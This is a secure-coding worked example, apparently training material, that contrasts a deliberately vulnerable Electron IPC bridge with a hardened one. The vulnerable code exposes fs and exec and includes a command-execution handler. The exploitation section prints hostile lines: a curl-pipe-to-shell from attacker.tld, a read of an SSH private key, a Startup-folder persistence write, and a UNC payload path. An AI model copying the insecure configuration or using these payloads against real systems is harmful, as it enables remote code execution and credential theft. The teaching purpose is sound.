# Worked Example — Electron IPC Bridge: Vulnerable vs. Remediated

**Module:** [02 — Desktop Process Isolation](../modules/02-desktop-process-isolation.md)
**Scenario:** A desktop notes application that exports a note to a file and opens documentation
links. The user asked the assistant to "let the app save files and open links."

---

## Part 1 — The vulnerable implementation

This is the shape a code generation model produces when the developer reports
`require is not defined`.

### `main.js` — vulnerable

```js
// ✗ VULNERABLE
const { app, BrowserWindow, ipcMain, shell } = require('electron');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

function createWindow() {
  const win = new BrowserWindow({
    width: 1200,
    height: 800,
    webPreferences: {
      nodeIntegration: true,        // ✗ CRITICAL — renderer gets Node.js
      contextIsolation: false,      // ✗ CRITICAL — preload shares the page context
      webSecurity: false,           // ✗ added to silence a CORS error
      preload: path.join(__dirname, 'preload.js'),
    },
  });
  win.loadURL('https://notes.example.com/app');   // ✗ remote origin + preload
  win.webContents.openDevTools();                 // ✗ ships to production
}

// ✗ No schema. No sender check. No path confinement. Shell execution.
ipcMain.handle('save-file', async (event, filePath, contents) => {
  fs.writeFileSync(filePath, contents);           // ✗ arbitrary write, anywhere
  return true;
});

ipcMain.handle('run-command', async (event, cmd) => {
  return new Promise((resolve) => exec(cmd, (e, out) => resolve(out)));  // ✗ RCE by design
});

ipcMain.handle('open-link', async (event, url) => {
  shell.openExternal(url);                        // ✗ file:///C:/Windows/System32/calc.exe
});

app.whenReady().then(createWindow);
```

### `preload.js` — vulnerable

```js
// ✗ VULNERABLE
const { contextBridge, ipcRenderer } = require('electron');
const fs = require('fs');
const { exec } = require('child_process');

contextBridge.exposeInMainWorld('api', {
  fs,                                                        // ✗ whole module
  exec,                                                      // ✗ whole capability
  ipcRenderer,                                               // ✗ entire IPC surface
  invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args),  // ✗ generic passthrough
  readFile: (p) => fs.readFileSync(p, 'utf8'),               // ✗ arbitrary path
  saveFile: (p, c) => ipcRenderer.invoke('save-file', p, c), // ✗ renderer chooses the path
});
```

### `renderer.js` — the call site that motivated all of it

```js
// ✗ VULNERABLE — renders untrusted note content
noteBody.innerHTML = note.contentHtml;      // synced from the server, or from a shared note
await window.api.saveFile(userChosenPath, note.contentHtml);
```

### Exploitation

The note body is rendered with `innerHTML`. In a browser that is a contained XSS. Here it is not.

A note whose content contains an injection payload — synced from a shared notebook, pasted from a
web page, or returned by a summarization feature — executes in the renderer. Because
`nodeIntegration: true`, that script has Node.js:

```js
// Payload inside note.contentHtml — executes on render
require('child_process').exec('curl https://attacker.tld/x.sh | sh');
```

Even with `nodeIntegration: false`, the preload hands over the same power:

```js
window.api.exec('whoami');                              // exposed module
window.api.invoke('run-command', 'shutdown /s /t 0');   // generic passthrough
window.api.readFile('C:/Users/me/.ssh/id_rsa');         // arbitrary path
window.api.saveFile('C:/Users/me/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.bat', 'evil');
```

And through `open-link`:

```js
window.api.invoke('open-link', 'file:///C:/Windows/System32/calc.exe');
window.api.invoke('open-link', '\\\\attacker.tld\\share\\payload.exe');
```

**Result:** full remote code execution as the logged-in user, from a piece of text. This is the
mechanism behind CVE-2026-32626 (CVSS 9.6) and CVE-2026-33336 — a web-layer rendering flaw
converted into host compromise by Electron configuration.

---

## Part 2 — The remediated implementation

### `main.js` — remediated

```js
// ✓ REMEDIATED
const { app, BrowserWindow, ipcMain, shell, session, dialog } = require('electron');
const { z } = require('zod');
const fs = require('node:fs/promises');
const path = require('node:path');

const APP_ORIGIN = 'app://notes';                    // local, registered scheme
const DOCS = new Map([                               // allowlist keyed by identifier
  ['getting-started', 'https://docs.example.com/getting-started'],
  ['shortcuts',       'https://docs.example.com/shortcuts'],
  ['privacy',         'https://docs.example.com/privacy'],
]);

app.enableSandbox();                                 // process-wide, before whenReady

function createWindow() {
  const win = new BrowserWindow({
    width: 1200,
    height: 800,
    webPreferences: {
      nodeIntegration: false,                        // ✓
      nodeIntegrationInWorker: false,                // ✓
      nodeIntegrationInSubFrames: false,             // ✓
      contextIsolation: true,                        // ✓
      sandbox: true,                                 // ✓
      webSecurity: true,                             // ✓
      allowRunningInsecureContent: false,            // ✓
      experimentalFeatures: false,                   // ✓
      webviewTag: false,                             // ✓
      safeDialogs: true,
      preload: path.join(__dirname, 'preload.js'),
    },
  });
  win.loadURL(`${APP_ORIGIN}/index.html`);           // ✓ local content, never a remote origin
  return win;
}

// ── Content Security Policy, set from the main process ────────────────────
function installCsp() {
  session.defaultSession.webRequest.onHeadersReceived((details, cb) => {
    cb({ responseHeaders: { ...details.responseHeaders,
      'Content-Security-Policy': [
        "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;" +
        " object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none';" +
        " connect-src 'self' https://api.example.com",
      ] } });
  });
  session.defaultSession.setPermissionRequestHandler((_wc, _perm, cb) => cb(false));
  session.defaultSession.setPermissionCheckHandler(() => false);
}

// ── Navigation and window creation: denied by default ─────────────────────
function lockNavigation() {
  app.on('web-contents-created', (_e, contents) => {
    const internal = (u) => { try { return new URL(u).origin === APP_ORIGIN; } catch { return false; } };

    contents.on('will-navigate', (e, url) => { if (!internal(url)) e.preventDefault(); });
    contents.on('will-frame-navigate', (e) => { if (!internal(e.url)) e.preventDefault(); });
    contents.setWindowOpenHandler(() => ({ action: 'deny' }));      // ✓ never 'allow'
    contents.on('will-attach-webview', (e, prefs) => {
      delete prefs.preload;
      prefs.nodeIntegration = false;
      prefs.contextIsolation = true;
      e.preventDefault();                                           // no webviews in this app
    });
  });
}

// ── Sender verification, shared by every handler ──────────────────────────
function assertTrustedSender(event) {
  const frame = event.senderFrame;
  if (!frame) throw new Error('E_FORBIDDEN');
  if (frame.parent !== null) throw new Error('E_FORBIDDEN');        // reject subframes
  let origin;
  try { origin = new URL(frame.url).origin; } catch { throw new Error('E_FORBIDDEN'); }
  if (origin !== APP_ORIGIN) throw new Error('E_FORBIDDEN');
}

// ── Handler 1: export a note ──────────────────────────────────────────────
// The renderer names WHAT to export. The main process decides WHERE it goes.
const ExportSchema = z.object({
  noteId: z.string().uuid(),
  format: z.enum(['txt', 'md', 'html']),
});

ipcMain.handle('note:export', async (event, payload) => {
  assertTrustedSender(event);                                       // 1. sender
  const { noteId, format } = ExportSchema.parse(payload);           // 2. schema

  const note = await notesStore.get(noteId);                        // 3. authorize
  if (!note || note.ownerId !== currentSession().userId) throw new Error('E_NOT_FOUND');

  // 4. confine — the user picks the destination through the OS dialog, which the
  //    renderer cannot script. The renderer never supplies or learns a path.
  const { canceled, filePath } = await dialog.showSaveDialog({
    defaultPath: `${note.title.replace(/[^\w. -]/g, '_').slice(0, 64)}.${format}`,
    filters: [{ name: format.toUpperCase(), extensions: [format] }],
  });
  if (canceled || !filePath) return { saved: false };

  await fs.writeFile(filePath, renderNote(note, format), 'utf8');   // 5. no shell, no exec
  return { saved: true };                                           // minimal result
});

// ── Handler 2: open a documentation page ──────────────────────────────────
// No URL crosses the bridge. The renderer sends an identifier.
const DocsSchema = z.object({ page: z.enum([...DOCS.keys()]) });

ipcMain.handle('docs:open', async (event, payload) => {
  assertTrustedSender(event);
  const { page } = DocsSchema.parse(payload);
  const url = DOCS.get(page);                                       // constant, not input
  const parsed = new URL(url);
  if (parsed.protocol !== 'https:') throw new Error('E_PROTOCOL');  // belt and braces
  await shell.openExternal(url);
  return { opened: true };
});

app.whenReady().then(() => { installCsp(); lockNavigation(); createWindow(); });
```

### `preload.js` — remediated

```js
// ✓ REMEDIATED — this is the complete, enumerable API surface of the application.
const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('appApi', {
  // One function per business operation. Typed parameters. Serialisable data only.
  exportNote: (noteId, format) => ipcRenderer.invoke('note:export', { noteId, format }),
  openDocsPage: (page)         => ipcRenderer.invoke('docs:open',  { page }),

  // Event listeners are wrapped so the raw IpcRendererEvent — which carries
  // event.sender, a live handle into the privileged side — never reaches the page.
  onSyncProgress: (cb) => {
    const handler = (_event, percent) => cb(percent);
    ipcRenderer.on('sync:progress', handler);
    return () => ipcRenderer.removeListener('sync:progress', handler);
  },
});
```

No `fs`. No `child_process`. No `shell`. No `ipcRenderer`. No generic `invoke`. No function that
accepts a path, a command, or a URL.

### `renderer.js` — remediated

```js
// ✓ REMEDIATED
noteBody.textContent = note.contentPlain;          // ✓ no innerHTML for untrusted content
// If rich text is genuinely required, sanitize with an explicit allowlist and
// keep the isolation flags — sanitization is defence in depth, not the boundary.

await window.appApi.exportNote(note.id, 'md');     // names WHAT, never WHERE
await window.appApi.openDocsPage('shortcuts');     // names WHICH, never a URL
```

---

## Part 3 — What changed, and why each change matters

| # | Vulnerable | Remediated | What it stops |
|---|---|---|---|
| 1 | `nodeIntegration: true` | `false` + `app.enableSandbox()` | Injected script cannot reach `require` |
| 2 | `contextIsolation: false` | `true` | Page cannot rewrite preload internals or prototypes |
| 3 | `webSecurity: false` | `true` | Same-origin policy restored; no arbitrary origin reads |
| 4 | Remote origin + preload | Local `app://` scheme | Server compromise cannot reach the bridge |
| 5 | `fs`, `exec`, `ipcRenderer` exposed | Two named functions | Removes the capability entirely, not just its callers |
| 6 | Generic `invoke(channel, …)` | Fixed channel per function | Future handlers are not auto-exposed |
| 7 | No sender check | `assertTrustedSender` | Subframes and injected frames cannot call handlers |
| 8 | No schema | `z.object(...).parse` | Type confusion and unexpected fields rejected |
| 9 | No authorization | Ownership check on `noteId` | Another user's note cannot be exported |
| 10 | Renderer-supplied path | OS save dialog, main-process write | No arbitrary write; no Startup-folder persistence |
| 11 | `exec(cmd)` | Handler deleted; `execFile` if ever needed | Removes command execution from the IPC surface |
| 12 | `shell.openExternal(url)` | Allowlist map + `https:` check | No `file://`, no UNC path, no `smb:` |
| 13 | No CSP | Main-process CSP, no `unsafe-inline` | Injected inline script does not run at all |
| 14 | `window.open` inherits | `setWindowOpenHandler` → `deny` | Closes the CVE-2026-34765 inheritance path |
| 15 | DevTools auto-opened | Removed from release | No local debugging channel |
| 16 | `innerHTML` | `textContent` | Removes the injection point that starts the chain |

Rows 1–4 alone downgrade the impact from host RCE to a contained rendering bug. Rows 5–12 are what
keep it contained once someone adds a feature next quarter.

---

## Part 4 — Verify the fix

```bash
npx @doyensec/electronegativity -i . -l 2
```

```bash
semgrep --config skills/semgrep-rules.yml .
```

```bash
node scripts/audit-native.mjs .
```

**Confirm the shipped artifact, not just the source:**

```bash
npx @electron/asar extract dist/mac/Notes.app/Contents/Resources/app.asar /tmp/unpacked
```

```bash
grep -rEn "nodeIntegration: *true|contextIsolation: *false|webSecurity: *false|sandbox: *false" /tmp/unpacked
```

**Negative tests to ship with the change:**

```js
test('bridge exposes only the two named operations', () => {
  expect(Object.keys(window.appApi).sort()).toEqual(['exportNote', 'onSyncProgress', 'openDocsPage']);
  expect(window.require).toBeUndefined();
  expect(window.process).toBeUndefined();
});

test('export rejects a note the session does not own', async () => {
  await expect(invokeAs(otherUser, 'note:export', { noteId: victimNoteId, format: 'md' }))
    .rejects.toThrow('E_NOT_FOUND');
});

test('export rejects a malformed payload', async () => {
  await expect(invoke('note:export', { noteId: '../../etc/passwd', format: 'md' }))
    .rejects.toThrow();
  await expect(invoke('note:export', { noteId: validId, format: 'exe' })).rejects.toThrow();
});

test('docs handler rejects an arbitrary URL', async () => {
  await expect(invoke('docs:open', { page: 'https://evil.tld' })).rejects.toThrow();
  await expect(invoke('docs:open', { page: 'file:///etc/passwd' })).rejects.toThrow();
});
```
